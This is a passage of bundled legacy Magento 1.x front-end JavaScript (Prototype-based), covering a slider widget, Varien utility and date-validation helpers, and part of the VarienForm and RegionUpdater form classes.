    this.restricted = this.options.restricted || false;

    this.maximum   = this.options.maximum || this.range.end;
    this.minimum   = this.options.minimum || this.range.start;

    // Will be used to align the handle onto the track, if necessary
    this.alignX = parseInt(this.options.alignX || '0');
    this.alignY = parseInt(this.options.alignY || '0');

    this.trackLength = this.maximumOffset() - this.minimumOffset();

    this.handleLength = this.isVertical() ?
      (this.handles[0].offsetHeight != 0 ?
        this.handles[0].offsetHeight : this.handles[0].style.height.replace(/px$/,"")) :
      (this.handles[0].offsetWidth != 0 ? this.handles[0].offsetWidth :
        this.handles[0].style.width.replace(/px$/,""));

    this.active   = false;
    this.dragging = false;
    this.disabled = false;

    if (this.options.disabled) this.setDisabled();

    // Allowed values array
    this.allowedValues = this.options.values ? this.options.values.sortBy(Prototype.K) : false;
    if (this.allowedValues) {
      this.minimum = this.allowedValues.min();
      this.maximum = this.allowedValues.max();
    }

    this.eventMouseDown = this.startDrag.bindAsEventListener(this);
    this.eventMouseUp   = this.endDrag.bindAsEventListener(this);
    this.eventMouseMove = this.update.bindAsEventListener(this);

    // Initialize handles in reverse (make sure first handle is active)
    this.handles.each( function(h,i) {
      i = slider.handles.length-1-i;
      slider.setValue(parseFloat(
        (Object.isArray(slider.options.sliderValue) ?
          slider.options.sliderValue[i] : slider.options.sliderValue) ||
         slider.range.start), i);
      h.makePositioned().observe("mousedown", slider.eventMouseDown);
    });

    this.track.observe("mousedown", this.eventMouseDown);
    document.observe("mouseup", this.eventMouseUp);
    $(this.track.parentNode.parentNode).observe("mousemove", this.eventMouseMove);


    this.initialized = true;
  },
  dispose: function() {
    var slider = this;
    Event.stopObserving(this.track, "mousedown", this.eventMouseDown);
    Event.stopObserving(document, "mouseup", this.eventMouseUp);
    Event.stopObserving(this.track.parentNode.parentNode, "mousemove", this.eventMouseMove);
    this.handles.each( function(h) {
      Event.stopObserving(h, "mousedown", slider.eventMouseDown);
    });
  },
  setDisabled: function(){
    this.disabled = true;
    this.track.parentNode.className = this.track.parentNode.className + ' disabled';
  },
  setEnabled: function(){
    this.disabled = false;
  },
  getNearestValue: function(value){
    if (this.allowedValues){
      if (value >= this.allowedValues.max()) return(this.allowedValues.max());
      if (value <= this.allowedValues.min()) return(this.allowedValues.min());

      var offset = Math.abs(this.allowedValues[0] - value);
      var newValue = this.allowedValues[0];
      this.allowedValues.each( function(v) {
        var currentOffset = Math.abs(v - value);
        if (currentOffset <= offset){
          newValue = v;
          offset = currentOffset;
        }
      });
      return newValue;
    }
    if (value > this.range.end) return this.range.end;
    if (value < this.range.start) return this.range.start;
    return value;
  },
  setValue: function(sliderValue, handleIdx){
    if (!this.active) {
      this.activeHandleIdx = handleIdx || 0;
      this.activeHandle    = this.handles[this.activeHandleIdx];
      this.updateStyles();
    }
    handleIdx = handleIdx || this.activeHandleIdx || 0;
    if (this.initialized && this.restricted) {
      if ((handleIdx>0) && (sliderValue<this.values[handleIdx-1]))
        sliderValue = this.values[handleIdx-1];
      if ((handleIdx < (this.handles.length-1)) && (sliderValue>this.values[handleIdx+1]))
        sliderValue = this.values[handleIdx+1];
    }
    sliderValue = this.getNearestValue(sliderValue);
    this.values[handleIdx] = sliderValue;
    this.value = this.values[0]; // assure backwards compat

    this.handles[handleIdx].style[this.isVertical() ? 'top' : 'left'] =
      this.translateToPx(sliderValue);

    this.drawSpans();
    if (!this.dragging || !this.event) this.updateFinished();
  },
  setValueBy: function(delta, handleIdx) {
    this.setValue(this.values[handleIdx || this.activeHandleIdx || 0] + delta,
      handleIdx || this.activeHandleIdx || 0);
  },
  translateToPx: function(value) {
    return Math.round(
      ((this.trackLength-this.handleLength)/(this.range.end-this.range.start)) *
      (value - this.range.start)) + "px";
  },
  translateToValue: function(offset) {
    return ((offset/(this.trackLength-this.handleLength) *
      (this.range.end-this.range.start)) + this.range.start);
  },
  getRange: function(range) {
    var v = this.values.sortBy(Prototype.K);
    range = range || 0;
    return $R(v[range],v[range+1]);
  },
  minimumOffset: function(){
    return(this.isVertical() ? this.alignY : this.alignX);
  },
  maximumOffset: function(){
    return(this.isVertical() ?
      (this.track.offsetHeight != 0 ? this.track.offsetHeight :
        this.track.style.height.replace(/px$/,"")) - this.alignY :
      (this.track.offsetWidth != 0 ? this.track.offsetWidth :
        this.track.style.width.replace(/px$/,"")) - this.alignX);
  },
  isVertical:  function(){
    return (this.axis == 'vertical');
  },
  drawSpans: function() {
    var slider = this;
    if (this.spans)
      $R(0, this.spans.length-1).each(function(r) { slider.setSpan(slider.spans[r], slider.getRange(r)) });
    if (this.options.startSpan)
      this.setSpan(this.options.startSpan,
        $R(0, this.values.length>1 ? this.getRange(0).min() : this.value ));
    if (this.options.endSpan)
      this.setSpan(this.options.endSpan,
        $R(this.values.length>1 ? this.getRange(this.spans.length-1).max() : this.value, this.maximum));
  },
  setSpan: function(span, range) {
    if (this.isVertical()) {
      span.style.top = this.translateToPx(range.start);
      span.style.height = this.translateToPx(range.end - range.start + this.range.start);
    } else {
      span.style.left = this.translateToPx(range.start);
      span.style.width = this.translateToPx(range.end - range.start + this.range.start);
    }
  },
  updateStyles: function() {
    this.handles.each( function(h){ Element.removeClassName(h, 'selected') });
    Element.addClassName(this.activeHandle, 'selected');
  },
  startDrag: function(event) {
    if (Event.isLeftClick(event)) {
      if (!this.disabled){
        this.active = true;

        var handle = Event.element(event);
        var pointer  = [Event.pointerX(event), Event.pointerY(event)];
        var track = handle;
        if (track==this.track) {
          var offsets  = Position.cumulativeOffset(this.track);
          this.event = event;
          this.setValue(this.translateToValue(
           (this.isVertical() ? pointer[1]-offsets[1] : pointer[0]-offsets[0])-(this.handleLength/2)
          ));
          var offsets  = Position.cumulativeOffset(this.activeHandle);
          this.offsetX = (pointer[0] - offsets[0]);
          this.offsetY = (pointer[1] - offsets[1]);
        } else {
          // find the handle (prevents issues with Safari)
          while((this.handles.indexOf(handle) == -1) && handle.parentNode)
            handle = handle.parentNode;

          if (this.handles.indexOf(handle)!=-1) {
            this.activeHandle    = handle;
            this.activeHandleIdx = this.handles.indexOf(this.activeHandle);
            this.updateStyles();

            var offsets  = Position.cumulativeOffset(this.activeHandle);
            this.offsetX = (pointer[0] - offsets[0]);
            this.offsetY = (pointer[1] - offsets[1]);
          }
        }
      }
      Event.stop(event);
    }
  },
  update: function(event) {
   if (this.active) {
      if (!this.dragging) this.dragging = true;
      this.draw(event);
      if (Prototype.Browser.WebKit) window.scrollBy(0,0);
      Event.stop(event);
   }
  },
  draw: function(event) {
    var pointer = [Event.pointerX(event), Event.pointerY(event)];
    var offsets = Position.cumulativeOffset(this.track);
    pointer[0] -= this.offsetX + offsets[0];
    pointer[1] -= this.offsetY + offsets[1];
    this.event = event;
    this.setValue(this.translateToValue( this.isVertical() ? pointer[1] : pointer[0] ));
    if (this.initialized && this.options.onSlide)
      this.options.onSlide(this.values.length>1 ? this.values : this.value, this);
  },
  endDrag: function(event) {
    if (this.active && this.dragging) {
      this.finishDrag(event, true);
      Event.stop(event);
    }
    this.active = false;
    this.dragging = false;
  },
  finishDrag: function(event, success) {
    this.active = false;
    this.dragging = false;
    this.updateFinished();
  },
  updateFinished: function() {
    if (this.initialized && this.options.onChange)
      this.options.onChange(this.values.length>1 ? this.values : this.value, this);
    this.event = null;
  }
});
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
function popWin(url,win,para) {
    var win = window.open(url,win,para);
    win.focus();
}

function setLocation(url){
    window.location.href = url;
}

function setPLocation(url, setFocus){
    if( setFocus ) {
        window.opener.focus();
    }
    window.opener.location.href = url;
}

function setLanguageCode(code, fromCode){
    //TODO: javascript cookies have different domain and path than php cookies
    var href = window.location.href;
    var after = '', dash;
    if (dash = href.match(/\#(.*)$/)) {
        href = href.replace(/\#(.*)$/, '');
        after = dash[0];
    }

    if (href.match(/[?]/)) {
        var re = /([?&]store=)[a-z0-9_]*/;
        if (href.match(re)) {
            href = href.replace(re, '$1'+code);
        } else {
            href += '&store='+code;
        }

        var re = /([?&]from_store=)[a-z0-9_]*/;
        if (href.match(re)) {
            href = href.replace(re, '');
        }
    } else {
        href += '?store='+code;
    }
    if (typeof(fromCode) != 'undefined') {
        href += '&from_store='+fromCode;
    }
    href += after;

    setLocation(href);
}

/**
 * Add classes to specified elements.
 * Supported classes are: 'odd', 'even', 'first', 'last'
 *
 * @param elements - array of elements to be decorated
 * [@param decorateParams] - array of classes to be set. If omitted, all available will be used
 */
function decorateGeneric(elements, decorateParams)
{
    var allSupportedParams = ['odd', 'even', 'first', 'last'];
    var _decorateParams = {};
    var total = elements.length;

    if (total) {
        // determine params called
        if (typeof(decorateParams) == 'undefined') {
            decorateParams = allSupportedParams;
        }
        if (!decorateParams.length) {
            return;
        }
        for (var k in allSupportedParams) {
            _decorateParams[allSupportedParams[k]] = false;
        }
        for (var k in decorateParams) {
            _decorateParams[decorateParams[k]] = true;
        }

        // decorate elements
        // elements[0].addClassName('first'); // will cause bug in IE (#5587)
        if (_decorateParams.first) {
            Element.addClassName(elements[0], 'first');
        }
        if (_decorateParams.last) {
            Element.addClassName(elements[total-1], 'last');
        }
        for (var i = 0; i < total; i++) {
            if ((i + 1) % 2 == 0) {
                if (_decorateParams.even) {
                    Element.addClassName(elements[i], 'even');
                }
            }
            else {
                if (_decorateParams.odd) {
                    Element.addClassName(elements[i], 'odd');
                }
            }
        }
    }
}

/**
 * Decorate table rows and cells, tbody etc
 * @see decorateGeneric()
 */
function decorateTable(table, options) {
    var table = $(table);
    if (table) {
        // set default options
        var _options = {
            'tbody'    : false,
            'tbody tr' : ['odd', 'even', 'first', 'last'],
            'thead tr' : ['first', 'last'],
            'tfoot tr' : ['first', 'last'],
            'tr td'    : ['last']
        };
        // overload options
        if (typeof(options) != 'undefined') {
            for (var k in options) {
                _options[k] = options[k];
            }
        }
        // decorate
        if (_options['tbody']) {
            decorateGeneric(table.select('tbody'), _options['tbody']);
        }
        if (_options['tbody tr']) {
            decorateGeneric(table.select('tbody tr'), _options['tbody tr']);
        }
        if (_options['thead tr']) {
            decorateGeneric(table.select('thead tr'), _options['thead tr']);
        }
        if (_options['tfoot tr']) {
            decorateGeneric(table.select('tfoot tr'), _options['tfoot tr']);
        }
        if (_options['tr td']) {
            var allRows = table.select('tr');
            if (allRows.length) {
                for (var i = 0; i < allRows.length; i++) {
                    decorateGeneric(allRows[i].getElementsByTagName('TD'), _options['tr td']);
                }
            }
        }
    }
}

/**
 * Set "odd", "even" and "last" CSS classes for list items
 * @see decorateGeneric()
 */
function decorateList(list, nonRecursive) {
    if ($(list)) {
        if (typeof(nonRecursive) == 'undefined') {
            var items = $(list).select('li')
        }
        else {
            var items = $(list).childElements();
        }
        decorateGeneric(items, ['odd', 'even', 'last']);
    }
}

/**
 * Set "odd", "even" and "last" CSS classes for list items
 * @see decorateGeneric()
 */
function decorateDataList(list) {
    list = $(list);
    if (list) {
        decorateGeneric(list.select('dt'), ['odd', 'even', 'last']);
        decorateGeneric(list.select('dd'), ['odd', 'even', 'last']);
    }
}

/**
 * Parse SID and produces the correct URL
 */
function parseSidUrl(baseUrl, urlExt) {
    var sidPos = baseUrl.indexOf('/?SID=');
    var sid = '';
    urlExt = (urlExt != undefined) ? urlExt : '';

    if(sidPos > -1) {
        sid = '?' + baseUrl.substring(sidPos + 2);
        baseUrl = baseUrl.substring(0, sidPos + 1);
    }

    return baseUrl+urlExt+sid;
}

/**
 * Formats currency using patern
 * format - JSON (pattern, decimal, decimalsDelimeter, groupsDelimeter)
 * showPlus - true (always show '+'or '-'),
 *      false (never show '-' even if number is negative)
 *      null (show '-' if number is negative)
 */

function formatCurrency(price, format, showPlus){
    var precision = isNaN(format.precision = Math.abs(format.precision)) ? 2 : format.precision;
    var requiredPrecision = isNaN(format.requiredPrecision = Math.abs(format.requiredPrecision)) ? 2 : format.requiredPrecision;

    //precision = (precision > requiredPrecision) ? precision : requiredPrecision;
    //for now we don't need this difference so precision is requiredPrecision
    precision = requiredPrecision;

    var integerRequired = isNaN(format.integerRequired = Math.abs(format.integerRequired)) ? 1 : format.integerRequired;

    var decimalSymbol = format.decimalSymbol == undefined ? "," : format.decimalSymbol;
    var groupSymbol = format.groupSymbol == undefined ? "." : format.groupSymbol;
    var groupLength = format.groupLength == undefined ? 3 : format.groupLength;

    var s = '';

    if (showPlus == undefined || showPlus == true) {
        s = price < 0 ? "-" : ( showPlus ? "+" : "");
    } else if (showPlus == false) {
        s = '';
    }

    var i = parseInt(price = Math.abs(+price || 0).toFixed(precision)) + "";
    var pad = (i.length < integerRequired) ? (integerRequired - i.length) : 0;
    while (pad) { i = '0' + i; pad--; }
    j = (j = i.length) > groupLength ? j % groupLength : 0;
    re = new RegExp("(\\d{" + groupLength + "})(?=\\d)", "g");

    /**
     * replace(/-/, 0) is only for fixing Safari bug which appears
     * when Math.abs(0).toFixed() executed on "0" number.
     * Result is "0.-0" :(
     */
    var r = (j ? i.substr(0, j) + groupSymbol : "") + i.substr(j).replace(re, "$1" + groupSymbol) + (precision ? decimalSymbol + Math.abs(price - i).toFixed(precision).replace(/-/, 0).slice(2) : "")
    var pattern = '';
    if (format.pattern.indexOf('{sign}') == -1) {
        pattern = s + format.pattern;
    } else {
        pattern = format.pattern.replace('{sign}', s);
    }

    return pattern.replace('%s', r).replace(/^\s\s*/, '').replace(/\s\s*$/, '');
};

function expandDetails(el, childClass) {
    if (Element.hasClassName(el,'show-details')) {
        $$(childClass).each(function(item){item.hide()});
        Element.removeClassName(el,'show-details');
    }
    else {
        $$(childClass).each(function(item){item.show()});
        Element.addClassName(el,'show-details');
    }
}

// Version 1.0
var isIE = navigator.appVersion.match(/MSIE/) == "MSIE";

if (!window.Varien)
    var Varien = new Object();

Varien.showLoading = function(){
    Element.show('loading-process');
}
Varien.hideLoading = function(){
    Element.hide('loading-process');
}
Varien.GlobalHandlers = {
    onCreate: function() {
        Varien.showLoading();
    },

    onComplete: function() {
        if(Ajax.activeRequestCount == 0) {
            Varien.hideLoading();
        }
    }
};

Ajax.Responders.register(Varien.GlobalHandlers);

/**
 * Quick Search form client model
 */
Varien.searchForm = Class.create();
Varien.searchForm.prototype = {
    initialize : function(form, field, emptyText){
        this.form   = $(form);
        this.field  = $(field);
        this.emptyText = emptyText;

        Event.observe(this.form,  'submit', this.submit.bind(this));
        Event.observe(this.field, 'focus', this.focus.bind(this));
        Event.observe(this.field, 'blur', this.blur.bind(this));
        this.blur();
    },

    submit : function(event){
        if (this.field.value == this.emptyText || this.field.value == ''){
            Event.stop(event);
            return false;
        }
        return true;
    },

    focus : function(event){
        if(this.field.value==this.emptyText){
            this.field.value='';
        }

    },

    blur : function(event){
        if(this.field.value==''){
            this.field.value=this.emptyText;
        }
    },

    initAutocomplete : function(url, destinationElement){
        new Ajax.Autocompleter(
            this.field,
            destinationElement,
            url,
            {
                paramName: this.field.name,
                method: 'get',
                minChars: 2,
                updateElement: this._selectAutocompleteItem.bind(this),
                onShow : function(element, update) {
                    if(!update.style.position || update.style.position=='absolute') {
                        update.style.position = 'absolute';
                        Position.clone(element, update, {
                            setHeight: false,
                            offsetTop: element.offsetHeight
                        });
                    }
                    Effect.Appear(update,{duration:0});
                }

            }
        );
    },

    _selectAutocompleteItem : function(element){
        if(element.title){
            this.field.value = element.title;
        }
        this.form.submit();
    }
}

Varien.Tabs = Class.create();
Varien.Tabs.prototype = {
  initialize: function(selector) {
    var self=this;
    $$(selector+' a').each(this.initTab.bind(this));
  },

  initTab: function(el) {
      el.href = 'javascript:void(0)';
      if ($(el.parentNode).hasClassName('active')) {
        this.showContent(el);
      }
      el.observe('click', this.showContent.bind(this, el));
  },

  showContent: function(a) {
    var li = $(a.parentNode), ul = $(li.parentNode);
    ul.getElementsBySelector('li', 'ol').each(function(el){
      var contents = $(el.id+'_contents');
      if (el==li) {
        el.addClassName('active');
        contents.show();
      } else {
        el.removeClassName('active');
        contents.hide();
      }
    });
  }
}

Varien.DateElement = Class.create();
Varien.DateElement.prototype = {
    initialize: function(type, content, required, format) {
        if (type == 'id') {
            // id prefix
            this.day    = $(content + 'day');
            this.month  = $(content + 'month');
            this.year   = $(content + 'year');
            this.full   = $(content + 'full');
            this.advice = $(content + 'date-advice');
        } else if (type == 'container') {
            // content must be container with data
            this.day    = content.day;
            this.month  = content.month;
            this.year   = content.year;
            this.full   = content.full;
            this.advice = content.advice;
        } else {
            return;
        }

        this.required = required;
        this.format   = format;

        this.day.addClassName('validate-custom');
        this.day.validate = this.validate.bind(this);
        this.month.addClassName('validate-custom');
        this.month.validate = this.validate.bind(this);
        this.year.addClassName('validate-custom');
        this.year.validate = this.validate.bind(this);

        this.setDateRange(false, false);
        this.year.setAttribute('autocomplete','off');

        this.advice.hide();
    },
    validate: function() {
        var error = false,
            day = parseInt(this.day.value.replace(/^0*/, '')) || 0,
            month = parseInt(this.month.value.replace(/^0*/, '')) || 0,
            year = parseInt(this.year.value) || 0;
        if (!day && !month && !year) {
            if (this.required) {
                error = 'This date is a required value.';
            } else {
                this.full.value = '';
            }
        } else if (!day || !month || !year) {
            error = 'Please enter a valid full date.';
        } else {
            var date = new Date, countDaysInMonth = 0, errorType = null;
            date.setYear(year);date.setMonth(month-1);date.setDate(32);
            countDaysInMonth = 32 - date.getDate();
            if(!countDaysInMonth || countDaysInMonth>31) countDaysInMonth = 31;

            if (day<1 || day>countDaysInMonth) {
                errorType = 'day';
                error = 'Please enter a valid day (1-%d).';
            } else if (month<1 || month>12) {
                errorType = 'month';
                error = 'Please enter a valid month (1-12).';
            } else {
                if(day % 10 == day) this.day.value = '0'+day;
                if(month % 10 == month) this.month.value = '0'+month;
                this.full.value = this.format.replace(/%[mb]/i, this.month.value).replace(/%[de]/i, this.day.value).replace(/%y/i, this.year.value);
                var testFull = this.month.value + '/' + this.day.value + '/'+ this.year.value;
                var test = new Date(testFull);
                if (isNaN(test)) {
                    error = 'Please enter a valid date.';
                } else {
                    this.setFullDate(test);
                }
            }
            var valueError = false;
            if (!error && !this.validateData()){//(year<1900 || year>curyear) {
                errorType = this.validateDataErrorType;//'year';
                valueError = this.validateDataErrorText;//'Please enter a valid year (1900-%d).';
                error = valueError;
            }
        }

        if (error !== false) {
            try {
                error = Translator.translate(error);
            }
            catch (e) {}
            if (!valueError) {
                this.advice.innerHTML = error.replace('%d', countDaysInMonth);
            } else {
                this.advice.innerHTML = this.errorTextModifier(error);
            }
            this.advice.show();
            return false;
        }

        // fixing elements class
        this.day.removeClassName('validation-failed');
        this.month.removeClassName('validation-failed');
        this.year.removeClassName('validation-failed');

        this.advice.hide();
        return true;
    },
    validateData: function() {
        var year = this.fullDate.getFullYear();
        var date = new Date;
        this.curyear = date.getFullYear();
        return (year>=1900 && year<=this.curyear);
    },
    validateDataErrorType: 'year',
    validateDataErrorText: 'Please enter a valid year (1900-%d).',
    errorTextModifier: function(text) {
        return text.replace('%d', this.curyear);
    },
    setDateRange: function(minDate, maxDate) {
        this.minDate = minDate;
        this.maxDate = maxDate;
    },
    setFullDate: function(date) {
        this.fullDate = date;
    }
};

Varien.DOB = Class.create();
Varien.DOB.prototype = {
    initialize: function(selector, required, format) {
        var el = $$(selector)[0];
        var container       = {};
        container.day       = Element.select(el, '.dob-day input')[0];
        container.month     = Element.select(el, '.dob-month input')[0];
        container.year      = Element.select(el, '.dob-year input')[0];
        container.full      = Element.select(el, '.dob-full input')[0];
        container.advice    = Element.select(el, '.validation-advice')[0];

        new Varien.DateElement('container', container, required, format);
    }
};

Varien.dateRangeDate = Class.create();
Varien.dateRangeDate.prototype = Object.extend(new Varien.DateElement(), {
    validateData: function() {
        var validate = true;
        if (this.minDate || this.maxValue) {
            if (this.minDate) {
                this.minDate = new Date(this.minDate);
                this.minDate.setHours(0);
                if (isNaN(this.minDate)) {
                    this.minDate = new Date('1/1/1900');
                }
                validate = validate && (this.fullDate >= this.minDate)
            }
            if (this.maxDate) {
                this.maxDate = new Date(this.maxDate)
                this.minDate.setHours(0);
                if (isNaN(this.maxDate)) {
                    this.maxDate = new Date();
                }
                validate = validate && (this.fullDate <= this.maxDate)
            }
            if (this.maxDate && this.minDate) {
                this.validateDataErrorText = 'Please enter a valid date between %s and %s';
            } else if (this.maxDate) {
                this.validateDataErrorText = 'Please enter a valid date less than or equal to %s';
            } else if (this.minDate) {
                this.validateDataErrorText = 'Please enter a valid date equal to or greater than %s';
            } else {
                this.validateDataErrorText = '';
            }
        }
        return validate;
    },
    validateDataErrorText: 'Date should be between %s and %s',
    errorTextModifier: function(text) {
        if (this.minDate) {
            text = text.sub('%s', this.dateFormat(this.minDate));
        }
        if (this.maxDate) {
            text = text.sub('%s', this.dateFormat(this.maxDate));
        }
        return text;
    },
    dateFormat: function(date) {
        return (date.getMonth() + 1) + '/' + date.getDate() + '/' + date.getFullYear();
    }
});

Varien.FileElement = Class.create();
Varien.FileElement.prototype = {
    initialize: function (id) {
        this.fileElement = $(id);
        this.hiddenElement = $(id + '_value');

        this.fileElement.observe('change', this.selectFile.bind(this));
    },
    selectFile: function(event) {
        this.hiddenElement.value = this.fileElement.getValue();
    }
};

Validation.addAllThese([
    ['validate-custom', ' ', function(v,elm) {
        return elm.validate();
    }]
]);

function truncateOptions() {
    $$('.truncated').each(function(element){
        Event.observe(element, 'mouseover', function(){
            if (element.down('div.truncated_full_value')) {
                element.down('div.truncated_full_value').addClassName('show')
            }
        });
        Event.observe(element, 'mouseout', function(){
            if (element.down('div.truncated_full_value')) {
                element.down('div.truncated_full_value').removeClassName('show')
            }
        });

    });
}
Event.observe(window, 'load', function(){
   truncateOptions();
});

Element.addMethods({
    getInnerText: function(element)
    {
        element = $(element);
        if(element.innerText && !Prototype.Browser.Opera) {
            return element.innerText
        }
        return element.innerHTML.stripScripts().unescapeHTML().replace(/[\n\r\s]+/g, ' ').strip();
    }
});

/*
if (!("console" in window) || !("firebug" in console))
{
    var names = ["log", "debug", "info", "warn", "error", "assert", "dir", "dirxml",
    "group", "groupEnd", "time", "timeEnd", "count", "trace", "profile", "profileEnd"];

    window.console = {};
    for (var i = 0; i < names.length; ++i)
        window.console[names[i]] = function() {}
}
*/

/**
 * Executes event handler on the element. Works with event handlers attached by Prototype,
 * in a browser-agnostic fashion.
 * @param element The element object
 * @param event Event name, like 'change'
 *
 * @example fireEvent($('my-input', 'click'));
 */
function fireEvent(element, event) {
    if (document.createEvent) {
        // dispatch for all browsers except IE before version 9
        var evt = document.createEvent("HTMLEvents");
        evt.initEvent(event, true, true ); // event type, bubbling, cancelable
        return element.dispatchEvent(evt);
    } else {
        // dispatch for IE before version 9
        var evt = document.createEventObject();
        return element.fireEvent('on' + event, evt)
    }
}

/**
 * Returns more accurate results of floating-point modulo division
 * E.g.:
 * 0.6 % 0.2 = 0.19999999999999996
 * modulo(0.6, 0.2) = 0
 *
 * @param dividend
 * @param divisor
 */
function modulo(dividend, divisor)
{
    var epsilon = divisor / 10000;
    var remainder = dividend % divisor;

    if (Math.abs(remainder - divisor) < epsilon || Math.abs(remainder) < epsilon) {
        remainder = 0;
    }

    return remainder;
}

/**
 * createContextualFragment is not supported in IE9. Adding its support.
 */
if ((typeof Range != "undefined") && !Range.prototype.createContextualFragment)
{
    Range.prototype.createContextualFragment = function(html)
    {
        var frag = document.createDocumentFragment(),
        div = document.createElement("div");
        frag.appendChild(div);
        div.outerHTML = html;
        return frag;
    };
}

/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
VarienForm = Class.create();
VarienForm.prototype = {
    initialize: function(formId, firstFieldFocus){
        this.form       = $(formId);
        if (!this.form) {
            return;
        }
        this.cache      = $A();
        this.currLoader = false;
        this.currDataIndex = false;
        this.validator  = new Validation(this.form);
        this.elementFocus   = this.elementOnFocus.bindAsEventListener(this);
        this.elementBlur    = this.elementOnBlur.bindAsEventListener(this);
        this.childLoader    = this.onChangeChildLoad.bindAsEventListener(this);
        this.highlightClass = 'highlight';
        this.extraChildParams = '';
        this.firstFieldFocus= firstFieldFocus || false;
        this.bindElements();
        if(this.firstFieldFocus){
            try{
                Form.Element.focus(Form.findFirstElement(this.form))
            }
            catch(e){}
        }
    },

    submit : function(url){
        if(this.validator && this.validator.validate()){
             this.form.submit();
        }
        return false;
    },

    bindElements:function (){
        var elements = Form.getElements(this.form);
        for (var row in elements) {
            if (elements[row].id) {
                Event.observe(elements[row],'focus',this.elementFocus);
                Event.observe(elements[row],'blur',this.elementBlur);
            }
        }
    },

    elementOnFocus: function(event){
        var element = Event.findElement(event, 'fieldset');
        if(element){
            Element.addClassName(element, this.highlightClass);
        }
    },

    elementOnBlur: function(event){
        var element = Event.findElement(event, 'fieldset');
        if(element){
            Element.removeClassName(element, this.highlightClass);
        }
    },

    setElementsRelation: function(parent, child, dataUrl, first){
        if (parent=$(parent)) {
            // TODO: array of relation and caching
            if (!this.cache[parent.id]){
                this.cache[parent.id] = $A();
                this.cache[parent.id]['child']     = child;
                this.cache[parent.id]['dataUrl']   = dataUrl;
                this.cache[parent.id]['data']      = $A();
                this.cache[parent.id]['first']      = first || false;
            }
            Event.observe(parent,'change',this.childLoader);
        }
    },

    onChangeChildLoad: function(event){
        element = Event.element(event);
        this.elementChildLoad(element);
    },

    elementChildLoad: function(element, callback){
        this.callback = callback || false;
        if (element.value) {
            this.currLoader = element.id;
            this.currDataIndex = element.value;
            if (this.cache[element.id]['data'][element.value]) {
                this.setDataToChild(this.cache[element.id]['data'][element.value]);
            }
            else{
                new Ajax.Request(this.cache[this.currLoader]['dataUrl'],{
                        method: 'post',
                        parameters: {"parent":element.value},
                        onComplete: this.reloadChildren.bind(this)
                });
            }
        }
    },

    reloadChildren: function(transport){
        var data = eval('(' + transport.responseText + ')');
        this.cache[this.currLoader]['data'][this.currDataIndex] = data;
        this.setDataToChild(data);
    },

    setDataToChild: function(data){
        if (data.length) {
            var child = $(this.cache[this.currLoader]['child']);
            if (child){
                var html = '<select name="'+child.name+'" id="'+child.id+'" class="'+child.className+'" title="'+child.title+'" '+this.extraChildParams+'>';
                if(this.cache[this.currLoader]['first']){
                    html+= '<option value="">'+this.cache[this.currLoader]['first']+'</option>';
                }
                for (var i in data){
                    if(data[i].value) {
                        html+= '<option value="'+data[i].value+'"';
                        if(child.value && (child.value == data[i].value || child.value == data[i].label)){
                            html+= ' selected';
                        }
                        html+='>'+data[i].label+'</option>';
                    }
                }
                html+= '</select>';
                Element.insert(child, {before: html});
                Element.remove(child);
            }
        }
        else{
            var child = $(this.cache[this.currLoader]['child']);
            if (child){
                var html = '<input type="text" name="'+child.name+'" id="'+child.id+'" class="'+child.className+'" title="'+child.title+'" '+this.extraChildParams+'>';
                Element.insert(child, {before: html});
                Element.remove(child);
            }
        }

        this.bindElements();
        if (this.callback) {
            this.callback();
        }
    }
}

RegionUpdater = Class.create();
RegionUpdater.prototype = {
    initialize: function (countryEl, regionTextEl, regionSelectEl, regions, disableAction, zipEl)
    {
        this.countryEl = $(countryEl);
        this.regionTextEl = $(regionTextEl);
        this.regionSelectEl = $(regionSelectEl);
        this.zipEl = $(zipEl);
        this.config = regions['config'];
        delete regions.config;
        this.regions = regions;

        this.disableAction = (typeof disableAction=='undefined') ? 'hide' : disableAction;
        this.zipOptions = (typeof zipOptions=='undefined') ? false : zipOptions;

        if (this.regionSelectEl.options.length<=1) {
            this.update();
        }

        Event.observe(this.countryEl, 'change', this.update.bind(this));
    },

    _checkRegionRequired: function()
    {
        var label, wildCard;
        var elements = [this.regionTextEl, this.regionSelectEl];
        var that = this;
        if (typeof this.config == 'undefined') {
            return;
        }
        var regionRequired = this.config.regions_required.indexOf(this.countryEl.value) >= 0;

        elements.each(function(currentElement) {
            Validation.reset(currentElement);
            label = $$('label[for="' + currentElement.id + '"]')[0];
            if (label) {
                wildCard = label.down('em') || label.down('span.required');
                if (!that.config.show_all_regions) {
                    if (regionRequired) {
                        label.up().show();
                    } else {
                        label.up().hide();
                    }
                }
            }

            if (label && wildCard) {
                if (!regionRequired) {
                    wildCard.hide();
                    if (label.hasClassName('required')) {
                        label.removeClassName('required');
                    }
                } else if (regionRequired) {
                    wildCard.show();
                    if (!label.hasClassName('required')) {
                        label.addClassName('required')
                    }
                }
            }

            if (!regionRequired) {
                if (currentElement.hasClassName('required-entry')) {
                    currentElement.removeClassName('required-entry');
                }
                if ('select' == currentElement.tagName.toLowerCase() &&
                    currentElement.hasClassName('validate-select')) {
                    currentElement.removeClassName('validate-select');
                }
